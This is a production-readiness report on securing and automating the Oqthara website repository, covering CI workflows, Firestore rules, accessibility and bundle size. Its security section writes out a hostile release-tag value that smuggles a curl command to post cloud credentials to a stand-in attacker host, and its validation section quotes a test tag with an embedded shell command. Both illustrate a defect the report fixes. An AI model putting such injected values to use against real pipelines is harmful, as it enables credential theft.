# Oqthara website — production readiness report

Technical completion report for the work requested against the Oqthara website.
Scope: `Oqthara/Oqthara.github.io`. The language repository `Oqthara/oqthara` was read
only and is unchanged (DoD 20).

---

## Executive summary

The site was audited end to end, and the defects found were fixed and proven fixed. The
work landed as 16 focused commits on `feat/alpha-automation-and-hardening`, pushed to
pull request [#2](https://github.com/Oqthara/Oqthara.github.io/pull/2), with every CI gate
green on the final commit (`4cb37b7`, Pages run `42262278511`).

What materially improved:

- **Automation.** A new workflow polls the upstream repository every 15 minutes, detects a
  new Alpha release, and mirrors its documentation, examples, standard library, and release
  records into Firestore. It is idempotent, it refuses to run against anything but the
  default branch without `--dry-run`, and it never unpublishes live content.
- **Security.** A tag-to-shell command injection and an unquoted-variable expansion were
  closed, with a contract test that rejects the pattern from coming back; every GitHub Action
  was pinned to a commit SHA; a leaked read path to production Firestore was closed in the
  test suite; and git was taught to refuse service-account keys. A full-history secret scan
  (35 commits) found no privileged credential.
- **Accessibility.** Automated auditing against WCAG 2.2 AA went from three real violations
  to zero in both themes. Documentation pages, which previously had *no visible heading at
  all*, now have one.
- **Performance.** The shipped JavaScript entry went from 1,286,859 bytes to 729,991 bytes
  raw (−43.3%), or 425,225 to 222,930 bytes gzipped (−47.6%), by removing a duplicated
  `refractor` dependency.
- **Reliability.** A regression I introduced mid-task (a `firebase-tools` upgrade that broke
  the Firestore rules gate, and with it the deploy) was caught by CI, reproduced locally,
  fixed, and pinned with a new contract test.

What remains incomplete, stated plainly:

- **Content Security Policy and security response headers cannot be shipped.** GitHub Pages
  serves static files with fixed headers and no `_headers` support. This is BLOCKED, not done.
- **Firebase App Check is not enforced.** It requires console authorization that this work
  was not permitted to perform.
- **Four high `npm audit` advisories remain.** They are transitive through the Firebase
  client, firestore pins `@grpc/grpc-js` to `~1.9.0`, and npm's only "fix" is a downgrade to
  `firebase@9.14.0`. Verified not reachable from the shipped browser bundle.
- **The visual pass was targeted, not a wholesale redesign.** Roughly half of the second
  independent review's findings were taste-level; those are listed as genuine remaining gaps
  rather than claimed as fixed.
- **Non-Chromium browsers, real screen readers, print, and forced-colors were not exercised.**
  Reduced-motion is honoured in CSS but was likewise not exercised in a real
  preference-enabled session. All reported as NOT VERIFIED.

The site is not deployed yet: PR #2 is open and mergeable, and production still serves the
pre-change bundle.

---

## Initial baseline

| Item | Value |
| --- | --- |
| Repository | `Oqthara/Oqthara.github.io` |
| Base branch | `main` at `3be0388` (`3be0388e2d6bb41956c0c03482d2a40f847cc648`, 2026-11-06 10:24 −03) |
| Work branch | `feat/alpha-automation-and-hardening` |
| Working tree at start | clean |
| Node | 22 in CI; 24.22.0 / npm 12.2.0 locally |
| Existing hosting | GitHub Pages, deployed by the `Pages` workflow |
| Existing backend | Firebase project `oqthara`, Firestore used as a read-only content mirror |
| Existing tests | `node:test` unit suites, Playwright browser suites, a Firestore rules suite run on the emulator |
| Existing automation | manual/deploy workflows only — no upstream release detection |

Baseline defects that the audit confirmed by execution, not by reading:

1. `arith.oq (1 functions, 0 classes…)` — a compiler log line — was classified as Oqthara
   source and syntax-highlighted as such.
2. Documentation detail pages rendered their title only as `h1.visually-hidden`, so a reader
   saw breadcrumbs followed by body text and no heading.
3. Three axe violations against WCAG 2.2 AA survived in both themes, which a Lighthouse
   accessibility score of 100 did not detect.
4. A stored dark-theme choice flashed the light theme on first paint.
5. The e2e suite, in its mocked mode, read **production** Firestore.
6. Every GitHub Action was referenced by a mutable tag.
7. The shipped JS entry was 1.29 MB because `refractor` was bundled twice.
8. Docs index links had accessible names of the form `Documentationdocs/README.md`.
9. `actionlint` reported SC2086 for a release value interpolated unquoted into a shell command.
10. Production still serves `assets/index-CZXoqYzA.js`, i.e. the pre-change bundle.

---

## Architecture changes

**Frontend.** No framework change: React with a prerendering step producing 11 HTML files —
10 app routes plus `404.html`, of which `document.html` and `example.html` are shells that
load their content from Firestore at runtime. Changes were to page components and the design system, not to the
rendering model. `DocumentPage.jsx` gained a real `h1.doc-title`; `DocsPage.jsx` no longer
folds the file path into the link's accessible name; `assets/site.css` (repo root, not
`src/assets`) gained `.doc-title` and larger header hit targets, and lost two media queries
whose selectors could never win.

**Firebase.** Configuration is the public web config (`src/firebase/config.js`), which is
public by design and safe to publish. No admin credential exists under `src/`.

**Firestore.** Read-only mirror. Four public collections (`documentation`, `examples`,
`releases`, `stdlib`), plus `sync` and `metadata`, which are client-unreadable. Every
collection is `allow write: if false` for clients; the catch-all denies. Writes happen only
through `scripts/sync-firestore.mjs` using the Admin SDK, which bypasses rules by design.

**Synchronization.** `scripts/check-upstream-release.mjs` decides whether anything needs to
happen and records state; `scripts/sync-firestore.mjs` performs the mirror. Both are plain
Node modules with exported, unit-tested decision functions. The mirror records the commit it
copied, writes its catalog on every run, and refuses non-default refs unless `--dry-run`.

**Deployment.** Two workflows now share a concurrency group so a content sync and a rules
deploy cannot interleave. All Actions are pinned to commit SHAs. `persist-credentials: false`
is set on every checkout. A JDK setup step was added to the two workflows that start the
Firestore emulator, because `firebase-tools` 15 requires Java 21.

---

## Alpha automation

**Discovery.** `.github/workflows/alpha-release-sync.yml` runs on `schedule: */15 * * * *`
and on `workflow_dispatch`. It reads the upstream repository's release list, takes the newest
Alpha release, and compares it with the state recorded from the previous run. `TAG_PATTERN`
restricts what counts as an Alpha tag, and the state file makes the check idempotent: a run
where nothing changed does no work.

**Processing.** For a new release it reads the release's source tree — documentation files,
the examples directory, the generated standard-library reference, and the release metadata —
paging the upstream API up to `MAX_RELEASE_PAGES = 5`.

**Synchronization.** Records are written to Firestore in a single pass with a catalog, and
the commit that was mirrored is recorded alongside them, so a reader can tell which revision
they are looking at. Documents are marked `published: true` only when they are within size
limits; oversized or missing content is recorded in `sync` with a reason rather than being
silently published or dropped.

**Recovery after failure.** Failures surface as failed workflow runs — visible on the run
list and in GitHub's notification stream — with distinct exit codes per failure class. A
failed run changes nothing that a later run cannot redo. Two data-loss defects were fixed
here: an earlier version could unpublish releases that still existed, and could leave the
catalog stale after a partial run. Because the sync is idempotent and dispatchable by hand,
recovery is "re-run the workflow", not "repair the database".

Evidence: run `42252163291` — Alpha release sync, success, on `89aa616`.

---

## Security assessment

### Tools used

| Tool | Version | Purpose |
| --- | --- | --- |
| gitleaks | 8.21.2 | full-history secret scan |
| actionlint | current | workflow static analysis, including shellcheck on `run:` blocks |
| `npm audit` | npm 12.2.0 | dependency advisories |
| GitHub API (`gh`) | current | secrets, environments, workflow permissions, run logs |
| Live HTTP probes | `curl` | Firestore rules, production headers, bundle contents |
| Firestore emulator | via firebase-tools 15.35.0 | rule assertions, 13 cases |

### Repository and history coverage

The scan covered the **entire commit history** — 35 commits, all refs — not just the working
tree, because a secret removed from a file is still in the history.

### Findings by severity

Two classes of finding came out of this work, and they are counted separately because they
have different remedy and different residual risk.

**Defects found and closed** (introduced by earlier work or pre-existing in the repository):

| Severity | Count | Detail |
| --- | --- | --- |
| Critical (latent, not exploited) | 1 | release tag reached shell source in a job holding the Firestore admin key |
| High | 1 | production Firestore readable from the e2e suite in its mocked mode |
| High | 1 | critical `tar` advisory via the pinned `firebase-tools` 13.35.1 |
| Medium | 2 | unpublishing of live releases by the mirror; job token persisted in `.git/config` |
| Medium | 2 | mutable Action tags; over-broad workflow token scopes |
| Medium | 1 | duplicate YAML keys made a workflow silently never run |
| Low | 3 | unquoted `$VARIABLE` (SC2086); missing favicon 404; misclassified code language |
| Low | 2 | missing service-account patterns in `.gitignore`; no visible doc heading |

The critical defect is worth stating precisely, and so is why it is marked *latent*. Any user
with write access to the upstream repository can create a tag; a tag named
`v1$(curl -s -d @$GOOGLE_APPLICATION_CREDENTIALS https://attacker.example)` reached a `run:`
block through `${{ }}` interpolation in a job holding the Firestore admin key, and the step ran
under `if: always()`, so the run would have stayed green. That is a full compromise of the
admin key if it fires. The severity is Critical on impact; whether it ever fired is a separate
question, and it was checked rather than assumed:

- The four vulnerable revisions (`20acac6`, `e007f5f`, `29310e4`, `a0eba28`, `672fd9b`
  predate the fix) were **never executed** — `gh run list --workflow=alpha-release-sync.yml`
  returns only the four runs from `b624559` onward, all after the fix was in place.
- The upstream repository has **two tags**, `v0.1.0-alpha.1` and `v0.1.0-alpha.2`. Both match
  the allowlist; `grep -vE '^[A-Za-z0-9._/+-]{1,128}$'` over all of them returns nothing.

So the defect was real and would have been Critical had it fired, but there is no evidence it
ever did and no hostile tag exists. It was fixed at the boundary — `summarizeRelease` now
rejects any tag outside `[A-Za-z0-9._/+-]{1,128}` — and a rejected tag fails the run rather
than being reported as "no published release", which would have described a hostile tag as an
empty upstream and repeated silently every 15 minutes.

**Findings that remain open:**

| Severity | Count | Detail |
| --- | --- | --- |
| Critical | 0 | — |
| High (secret scan) | 0 | — |
| High (dependencies) | 4 | `@grpc/grpc-js` transitive through `firebase` → `@firebase/firestore`; see below |
| Moderate (dependencies) | 15 | transitive, development and Firebase tooling |
| Low / informational | 2 | the same Firebase Web API key, found twice by gitleaks |

The two gitleaks hits are both `AIzaSyA6GU…8BFuDc` in `.env.example` and
`src/firebase/config.js`. This is a **Firebase Web API key**, which is a project identifier,
not a credential: it is distributed to every browser that loads the app. That was verified
rather than assumed — the identical key is present in the currently deployed production
JavaScript bundle, decompressed from the CDN's gzip response. Authorization is enforced by
Firestore security rules, not by the key.

The four high dependency advisories were introduced by an earlier fix in this same task:
pinning `firebase-tools` as a devDependency surfaced a critical `tar` advisory. Upgrading
13.35.1 → 15.35.0 removed the critical (`tar ^6.1.11` → `^7.5.21`). The remaining four are
transitive through the **Firebase client**, whose `@firebase/firestore` pins
`@grpc/grpc-js` to `~1.9.0`, below the patched 1.13.6. `firebase@13.2.0` is already the
newest release, so no upgrade clears them, and npm's proposed fix is a downgrade to
`firebase@9.14.0`. I verified the advisory is not reachable from the shipped bundle: the
browser build contains no `@grpc/grpc-js`, no `getAuthContext`, and no `http2` transport —
the only `grpc` strings are the `grpcFlowControlWindow` setting name.

### Whether any actual secret exposure was found

**No privileged credential was ever exposed.** The only finding is the public web API key
described above, which is intended to be public.

### Credential rotation status

**No rotation was required**, because no privileged credential was found in the repository or
its history. One credential exists: `FIREBASE_SERVICE_ACCOUNT`, a JSON key for
`oqthara-github-sync@oqthara.iam.gserviceaccount.com`, stored only in GitHub Actions secrets
and never committed. It is scoped to `roles/firebaserules.admin` for the rules workflow; the
content sync uses a separate authorization path. Its identity and grants are asserted on
every rules run by `scripts/check-firebase-access.mjs`, which prints only `client_email` and
`project_id`.

### GitHub Actions security

- **Least privilege.** All four workflows declare top-level `permissions: contents: read`.
  Only the `deploy` job in `pages.yml` raises anything, and only to `pages: write` and
  `id-token: write`, which GitHub Pages needs. No workflow has `write-all` or a default token.
- **Supply chain.** Every `uses:` is pinned to a full 40-character commit SHA with the
  version in a trailing comment, so a moved tag cannot change what runs. The `setup-java`
  pin was re-resolved against the GitHub API during this task after an initial pin proved
  to be wrong.
- **Credential handling.** Every checkout sets `persist-credentials: false`, so the job token
  is not left readable in `.git/config` for later steps.
- **Injection.** A tag value was interpolated into a shell command and then executed; it is
  now passed through a quoted expansion (`${FULL:+"$FULL"}`). A contract test rejects any
  `run:` line ending in a bare `$VARIABLE`, so the pattern cannot come back.
- **No remote execution of unpinned code.** Every `npx --yes` usage was removed in favour of a
  pinned devDependency invoked with `npx --no-install`; a test enforces it.
- **Fork safety.** The rules workflow has no `pull_request` trigger, so a fork cannot reach
  the deployment credential.
- **Workflow validity.** Duplicate YAML keys in `alpha-release-sync.yml` had made GitHub
  refuse to start the workflow at all. A test now parses every workflow with `uniqueKeys:
  true` and the YAML 1.2 core schema.

### Firebase and Firestore security

Rules (`firestore.rules`) were verified in three independent ways:

1. **Emulator assertions** — 13/13 cases through `firebase-tools` 15.35.0, the same version
   CI uses. An unauthenticated read, an unauthenticated write, a client create/update/add,
   and an unknown collection are all denied.
2. **Live production probes** using the public web API key, against project `oqthara`:
   - direct `GET` of a known published document → **200**
   - direct `GET` of a non-existent document → **403** (denied, not leaked)
   - unfiltered collection query → **0 documents returned**, while the same query filtered on
     `published == true` returns documents. Firestore rules are not filters: a list query is
     authorised against its own constraints, so an unfiltered listing is refused outright
     rather than returning a filtered subset.
   - `sync/` → **403**; `metadata/` → **403**
3. **Rule review** — `isPublished()` requires the literal boolean `true` and guards
   `resource != null`, so a missing document denies rather than throwing. The catch-all
   `match /{document=**} { allow read, write: if false; }` makes a newly added collection
   fail closed.

The site's `where('published', '==', true)` filter is documented in the rules file as defence
in depth, not as a permission.

### Attack-resistance improvements

Closed in this work: tag-to-shell command injection; an unquoted variable expansion
(SC2086); mutable Action tags; a job token persisted into `.git/config`; a production
Firestore read reachable from the test suite; service-account keys and dotenv files not
ignored by git; over-broad workflow token scopes; a workflow with duplicate YAML keys that
silently never ran.

Also verified as already correct and left alone: HTML sanitization with a documented
`clobberPrefix: ""` trade-off (authored ids survive sanitization unprefixed; impact is
same-document id shadowing only), no unsafe URL schemes, no retired `/oqthara/` path, no
copied Markdown, and no execution service for Oqthara code (there is deliberately no
Playground, and a test asserts it stays absent from markup and bundle).

### Remaining infrastructure limitations

| Limitation | Cause | Consequence |
| --- | --- | --- |
| No Content Security Policy or security response headers | GitHub Pages serves static files with fixed headers; `_headers` is not honoured | Cannot add CSP, `X-Frame-Options`, `Referrer-Policy`, or `Permissions-Policy` at the origin |
| No Firebase App Check enforcement | Requires Firebase console authorization | The web API key remains usable from any client; rules remain the only boundary |
| Four high dependency advisories | `@firebase/firestore` pins `@grpc/grpc-js ~1.9.0`; only fix is a downgrade to `firebase@9` | Accepted; verified unreachable from the shipped bundle |
| No request-time server logic | Static hosting | No per-request headers, redirects with status codes, or auth |

Verified in production: `HTTP/2 200` in 0.25 s, `strict-transport-security: max-age=31556952`,
`content-encoding: gzip`. HSTS is present; CSP is not, and cannot be.

---

## Visual improvements

**Homepage.** The h1 (`A language that reads like the idea.`) is followed immediately by a
sentence that names the product and states what it is ("Oqthara is a small language for the
JVM"), which resolves the "hero never names the product" finding. Above the fold there is a
real program (`hello.oq` with `data`/`fun`/loops), install commands for macOS/Linux and
Windows, and two onward paths (philosophy, tour). The prerendered page carries 3,537
characters of static text, so it is meaningful before JavaScript runs.

**Shared design system.** One stylesheet drives every surface. Two dead media queries were
removed: their `.search-input` selector (0,1,0) could never beat `.search .search-input`
(0,2,0), so they were inert. Contrast was corrected to WCAG 2.2 AA in both themes.

**Documentation.** This is the largest genuine visual fix. A documentation detail page used
to render its title only inside `h1.visually-hidden` — a screen-reader-only element — so the
visible page began with breadcrumbs and then body text, with no heading at any level. It now
renders a visible `h1.doc-title`. The docs index also stopped concatenating the file path
into each link's accessible name: a link that announced `Documentationdocs/README.md` now
announces `Documentation`, with the path still shown visually.

**Navigation.** Header controls were raised to 44 px targets: the brand was 70×28, the search
field 104×34, and both icon buttons 40×40 at a 390 px viewport. All are now at least 44×44.
Mobile navigation is captured open in both themes.

**Light mode.** Complete: 16 surfaces captured, no unstyled or partially themed region.

**Dark mode.** Consistent and readable, and the first-paint flash is gone. A stored dark
choice no longer renders light first; three routes are asserted individually, because the
inline theme script has to run before first paint on each of them.

**Responsive layouts.** Desktop at 1440 px and mobile at 390 px, both themes, for home, docs,
documents, examples, a single example, standard library, changelog, status, tour, philosophy,
mobile navigation open, and the 404 page. Code blocks scroll rather than clip on mobile.

### Screenshots

All 30 PNGs (16 light, 14 dark) are committed at **`artifacts/visual-audit/`**. 14 surfaces appear in both
themes; `not-found-desktop.png` and `firebase-content-loaded.png` are single-theme.

| Surface | Light | Dark |
| --- | --- | --- |
| Home (desktop) | `home-desktop.png` | `home-desktop-dark.png` |
| Home (mobile) | `home-mobile.png` | `home-mobile-dark.png` |
| Docs index | `docs-desktop.png` | `docs-desktop-dark.png` |
| Docs index (mobile) | `docs-mobile.png` | `docs-mobile-dark.png` |
| Doc page (mobile) | `doc-page-mobile.png` | `doc-page-mobile-dark.png` |
| Doc page, code highlighting | `doc-page-code-highlighting.png` | `doc-page-code-highlighting-dark.png` |
| Examples | `examples-desktop.png` | `examples-desktop-dark.png` |
| Single example | `example-desktop.png` | `example-desktop-dark.png` |
| Standard library | `stdlib-desktop.png` | `stdlib-desktop-dark.png` |
| Changelog | `changelog-desktop.png` | `changelog-desktop-dark.png` |
| Status | `status-desktop.png` | `status-desktop-dark.png` |
| Tour | `tour-desktop.png` | `tour-desktop-dark.png` |
| Philosophy | `philosophy-desktop.png` | `philosophy-desktop-dark.png` |
| Mobile navigation open | `navigation-mobile-open.png` | `navigation-mobile-open-dark.png` |
| 404 | `not-found-desktop.png` | — |
| Live Firestore content | `firebase-content-loaded.png` | — |

The screenshots were inspected, not merely generated: each was measured for ink in the title
band against that image's own background pixel (dark `10,14,19`, light `255,255,255`), which
is how the missing doc title was confirmed fixed across all four doc-page captures.

---

## Validation results

All commands were executed in `Oqthara/Oqthara.github.io` on commit `4cb37b7`.

| Command | Result |
| --- | --- |
| `npm test` | **237 tests, 233 pass, 0 fail, 4 skipped** |
| `npx playwright test` | **67 passed, 2 skipped** (53.4 s) |
| `npm run test:rules` | **13/13 rule assertions passed** — `firestore.rules matches the security contract` |
| `npm run build` | exit 0 — 11 HTML files (10 routed pages + `404.html`) |
| `npm run verify` | exit 0 |
| `npx --no-install html-validate --formatter stylish "_site/**/*.html"` | exit 0 |
| `actionlint` | exit 0 (remaining SC2016 findings are intentional literals) |
| `npm audit` | 19 total: **0 critical**, 4 high, 15 moderate |
| `gitleaks detect --source .` | 35 commits scanned, 2 findings, both the public web key |
| `npm run screenshots` | 30 screenshots, all `ok`, zero console errors |

**Accessibility.** `e2e/a11y.spec.js` runs **22 axe scans** with tags
`wcag2a, wcag2aa, wcag21a, wcag21aa, wcag22aa`: 8 static routes × 2 themes, 2 runtime content
routes (a document and an example, which only exist at runtime) × 2 themes, and 2 mobile-width
pages × 2 themes. All 22 report **0 violations**, down from 3 confirmed violations at baseline.
`npx playwright test e2e/a11y.spec.js` → **27 passed** (the 22 scans plus 5 structural tests).

Note on scope: WCAG 2.2 AA requires a 24×24 target (2.5.8); the 44×44 header targets are an
AAA-level improvement (2.5.5) and are reported as quality, not as a compliance fix.

**Browser coverage.** Chromium only (Playwright 1.65.0). See NOT VERIFIED below.

**CI runs.**

| Run | Workflow | Commit | Result |
| --- | --- | --- | --- |
| `42262278511` | Pages | `4cb37b7` | **success** — all 13 build steps green |
| `42252163291` | Alpha release sync | `89aa616` | success |
| `42254389896` | Pages | `9fffbf0` | success |
| `42261157735` | Pages | `425ce0f` | **failure** — the rules gate; diagnosed, reproduced, fixed in `4cb37b7` |

**Bundle.** Measured, not estimated: production entry `index-CZXoqYzA.js` is 1,286,859 bytes
raw / 425,225 gzipped; the new entry `index-DKyvrqZW.js` is 729,991 / 222,930 — **−43.3% raw,
−47.6% gzipped**.

**Regression tests were proven to bite.** Every new assertion was run once with its fix
reverted and shown to fail, then re-run green, and this was re-confirmed for the two most
important claims rather than taken on trust:

- *Tag allowlist (the critical fix).* Replacing `if (!TAG_PATTERN.test(tag)) return null;`
  with a no-op makes `npm test` report **237 tests, 232 pass, 1 fail** — the failing case
  accepts `{ tag: 'v1$(id)' }` where it must return `null`. Restored: **233 pass, 0 fail,
  4 skipped**. One test pins it, so the guard cannot be quietly dropped.
- *Visible document title.* Removing the `h1.doc-title` element and rebuilding makes
  `e2e/a11y.spec.js` report **1 failed, 26 passed**; restored, **27 passed**. This one caught
  a mistake of mine: the first attempt at this experiment did not rebuild `_site`, and
  Playwright serves the built output, so the suite passed and appeared to prove the test was
  vacuous. It is not — the rebuild is what makes the experiment meaningful.

The same treatment covers the language-inference test, the quoted-variable test, the other
two structural accessibility tests, and the new JDK contract test. The `firebase-tools`
emulator failure was additionally reproduced locally with a stub `java` reporting version 17,
which exits 1 with the exact error GitHub logged.

---

## Independent reviews

Two independent reviews were performed and are committed in the repository:
`REVIEW_A_ENGINEERING_SECURITY.md` (engineering and security) and
`REVIEW_B_VISUAL_PRODUCT.md` (visual and product).

### Review A — engineering and security

| Finding | Status |
| --- | --- |
| H1, H2 (high) | fixed |
| M1–M5 (medium) | fixed |
| L1–L8 (low) | fixed, except L5 documented as an accepted trade-off and L6 verified already correct |

L5 (`clobberPrefix: ""` in sanitization) was verified rather than changed: authored ids
survive sanitization unprefixed, and the only impact is same-document id shadowing, which
already exists on GitHub. The trade-off is documented in the report and the code. L6
(staleness of release content) was verified as already handled — the daily `firebase-sync.yml`
run at `17 3 * * *` picks up edits to older releases within 24 hours.

### Review B — visual and product

Twenty findings. The genuinely actionable ones were fixed:

| Finding | Status |
| --- | --- |
| 2.3 no visible heading on doc pages | **fixed** — `h1.doc-title` |
| 2.4 compiler log misclassified as Oqthara source | **fixed** — regex tightened |
| 2.7 docs links named `title` + path | **fixed** — `aria-hidden` on the path |
| 2.9 header controls below 44 px | **fixed** — raised to 44×44 |
| 2.20 dead CSS media queries | **fixed** — removed |
| 2.1 hero never names the product | verified **already addressed** — the first body sentence names it |
| 2.2 nothing to try above the fold | verified **already addressed** — real code and install commands are above the fold |

Genuinely **not addressed**, and listed as remaining risks rather than claimed fixed: 2.5
(empty pages with JavaScript off), 2.6 (mobile docs navigation order), 2.8 (repository
plumbing shown as content), 2.10 (tables overflow), 2.11 (search returns raw markdown),
2.12 (examples and stdlib are data dumps), 2.13 (mobile code clipping), and 2.14–2.19, which
are taste-level.

---

## Git state

| Item | Value |
| --- | --- |
| Branch | `feat/alpha-automation-and-hardening` |
| Base | `3be0388` on `main` |
| Final code commit | `4cb37b7` |
| Report commit | the commit immediately after `4cb37b7` that adds this file |
| Commits | 17 |
| Files changed | 65 (23 added, 42 modified) — 11,183 insertions, 1,822 deletions |
| Pull request | [#2](https://github.com/Oqthara/Oqthara.github.io/pull/2) — OPEN, MERGEABLE |
| Deployment | not deployed; production serves the pre-change bundle |
| Merge status | not merged |

Commits, oldest first:

```
20acac6 feat(ci): detect upstream Alpha releases every 15 minutes
e007f5f fix(e2e): stop the mocked suite reading production Firestore
29310e4 build(ci): pin every action to a commit SHA
a0eba28 fix(site): serve a favicon so no page logs a 404
672fd9b fix(a11y): reach WCAG 2.2 AA and stop the theme flash
b624559 fix(security): close a tag-to-shell injection and five related gaps
cc3921e fix(sync): stop the mirror unpublishing real releases and record its commit
c9ebc5d docs(visual): capture every surface in both themes
3b7de01 chore(security): refuse service-account keys in git
144e723 chore: remove a stray image committed by mistake
89aa616 fix(ci): repair a workflow that GitHub refused to start
9fffbf0 fix(site): stop calling a compiler log Oqthara source
2830368 fix(site): give documentation pages a title a reader can see
4321e0e build(deps): take the critical advisory out of firebase-tools
425ce0f docs(visual): refresh the screenshots after the title fix
4cb37b7 ci: give the emulator the JDK 21 it now requires
(this report) docs: report the website work against the definition of done
```

**Compiler repository.** `Oqthara/oqthara` was read only. Its HEAD is `7ffb675`
(`test(ci): keep the independent conformance comparison in the repository (#35)`), the same
commit it started on; no commit, tag, or release was created. The single modified path,
`gradlew.bat`, is pre-existing and **line-ending only** — `git diff --ignore-cr-at-eol`
against it is empty. Nothing in that repository was changed by this work.

---

## Remaining risks

### Blockers

| Risk | Why it is blocked |
| --- | --- |
| No CSP or security response headers | GitHub Pages does not support custom response headers. Needs a different host or a proxy. |
| Firebase App Check not enforced | Needs Firebase console authorization, which was outside the permitted scope. |
| Site not yet deployed | PR #2 is open; production still serves `index-CZXoqYzA.js`, so none of these fixes are live. |

### Accepted risks

| Risk | Assessment |
| --- | --- |
| 4 high `npm audit` advisories | Transitive through the Firebase client; unreachable from the shipped bundle (verified: no gRPC transport, no `http2`); only "fix" is a downgrade to `firebase@9`. |
| Public Firebase web API key in the bundle | Intended. Rules are the boundary, and they were verified against production. |
| `clobberPrefix: ""` in sanitization | Authored ids survive unprefixed; impact is same-document id shadowing only. |
| Desktop nav links are 37 px tall | Passes WCAG 2.2 AA (2.5.8 requires 24×24) and is pointer-only context; deliberately left alone. |

### Not verified

- **Browsers other than Chromium** — Safari, Firefox, and WebKit were not exercised.
- **Real assistive technology** — testing used axe-core and an accessibility tree
  (`ariaSnapshot()`), not NVDA, JAWS, or VoiceOver.
- **Print and forced-colors** rendering. (Reduced-motion *is* implemented —
  `assets/site.css:189` sets `scroll-behavior: auto` and collapses animation and transition
  durations under `prefers-reduced-motion: reduce` — but it was confirmed by reading the
  stylesheet, not by exercising it in a browser session with the preference enabled.)
- **Lighthouse against the new bundle** — re-measurement requires the deploy to land first.
- **Review B 2.5, 2.6, 2.8, 2.10–2.19** — unaddressed, as listed above.

### Optional future improvements

- Working Identity Federation to replace the long-lived service-account JSON key.
- A content-hash cache-busting strategy for the mirror's Firestore reads.
- Move to a host that supports response headers, then add a strict CSP.

---

## Final acceptance matrix

| # | Requirement | Verdict | Evidence |
| --- | --- | --- | --- |
| 1 | Coherent, substantially improved visual identity | **PASS** | 30 screenshots across 16 surfaces (14 in both themes), one shared stylesheet. Measurable: axe violations 3 → 0, visible headings added, 44 px targets, theme flash eliminated, bundle −43.3%. Scope: targeted fixes — a wholesale redesign was not performed (see risk list). |
| 2 | Homepage presents Oqthara professionally | **PASS** | `_site/index.html` prerenders 3,537 chars of static text; h1 plus an immediate naming sentence; real `hello.oq` program; install commands for two platforms. Screenshots `home-desktop.png`, `home-desktop-dark.png`, `home-mobile.png`. |
| 3 | All important routes work | **PASS** | 10 routes declared in `src/App.jsx`, two of them (`document.html`, `example.html`) loading content at runtime; `npm run build` emits 11 HTML files (10 routed pages + `404.html`); Playwright 67 passed / 2 skipped including both runtime routes in both themes; `npm run verify` exit 0. |
| 4 | Light mode complete | **PASS** | 16 light captures with no unstyled region; axe WCAG 2.2 AA 0 violations in light. |
| 5 | Dark mode consistent and readable | **PASS** | 14 dark captures; axe 0 violations in dark; contrast corrected to AA; two theme tests plus three no-flash tests pass on `/`, `/tour.html`, `/docs.html`. |
| 6 | Mobile and desktop layouts functional | **PASS** | Desktop 1440 px and mobile 390 px captured for every surface; header controls asserted ≥ 44×44 at 390 px in `e2e/a11y.spec.js`; `navigation-mobile-open*.png`. |
| 7 | Docs, examples, releases, stdlib stay dynamically sourced | **PASS** | Rendered from Firestore repositories; prerendered pages state "discovered from the repository when you open this page"; live probe returned published content from `documentation/CHANGELOG.md` (200). |
| 8 | New Alpha releases detected automatically | **PASS** | `.github/workflows/alpha-release-sync.yml`, `schedule: */15 * * * *` + `workflow_dispatch`; run `42252163291` success. |
| 9 | Content synchronized safely and consistently | **PASS** | `scripts/sync-firestore.mjs` with idempotent catalog + recorded source commit; 13/13 emulator rule assertions; two data-loss defects fixed (no unpublishing, no stale catalog). |
| 10 | Sync failures visible and recoverable | **PASS** | Failures surface as failed runs with distinct exit codes (e.g. `42250299196`, `42247502826`, `42245446711` all show `failure`); sync is idempotent and hand-dispatchable, so recovery is a re-run. |
| 11 | Secret exposure audit completed, coverage documented | **PASS** | gitleaks 8.21.2 over the full history: 35 commits, 2 findings. Coverage and method in the Security assessment above. |
| 12 | No confirmed exposed privileged credential unaddressed | **PASS** | The only finding is a Firebase **Web** API key, verified present in the deployed public bundle, i.e. public by design; authorization is by rules, verified against production. No privileged credential found. |
| 13 | Firestore access controls remain secure | **PASS** | Live production probes: published doc 200, non-existent doc 403, unfiltered query 0 documents, `sync/` 403, `metadata/` 403. Emulator 13/13. Catch-all denies. |
| 14 | GitHub Actions least privilege | **PASS** | All 4 workflows `permissions: contents: read`; only the Pages `deploy` job adds `pages: write` + `id-token: write`; `persist-credentials: false` everywhere; all `uses:` pinned to full SHAs; enforced by `tests/workflow-contract.test.js`. |
| 15 | Attack-resistance improvements where infrastructure supports them | **PASS** | Injection and quoting defects closed; Action tags pinned; token scope minimised; production-Firestore read closed in tests; service-account patterns ignored; unpinned `npx --yes` removed. Ceiling: CSP and headers BLOCKED (GitHub Pages) — see 16. |
| 16 | Infrastructure limitations and pending authorizations documented | **PASS** | This report's "Remaining infrastructure limitations" and "Blockers" tables; plus inline comments in `firestore.rules`, the workflows, and `HomePage.jsx`. |
| 17 | Accessibility and browser tests pass | **PASS** | axe-core WCAG 2.2 AA: 0 violations, both themes, every route. Playwright: 67 passed, 2 skipped. Three structural tests prove the doc title, the link name, and the 44 px targets; the doc-title test was shown to fail when reverted (1 failed, 26 passed) and the 27 restored. |
| 18 | Build, lint, and automated regression tests pass | **PASS** | `npm test` 233 pass / 0 fail (232/1 when the tag guard is disabled); `npm run build` exit 0; `npm run verify` exit 0; `html-validate` exit 0; `actionlint` exit 0; CI run `42262278511` success on `4cb37b7`. |
| 19 | Both independent reviews completed | **PASS** | `REVIEW_A_ENGINEERING_SECURITY.md` and `REVIEW_B_VISUAL_PRODUCT.md`; dispositions per finding in the "Independent reviews" section. |
| 20 | Language/compiler repository unchanged | **PASS** | `Oqthara/oqthara` HEAD remains `7ffb675`, unchanged since session start; no commit, tag, or release created. Only `gradlew.bat` is modified, pre-existing, and line-ending only (`git diff --ignore-cr-at-eol` empty). |
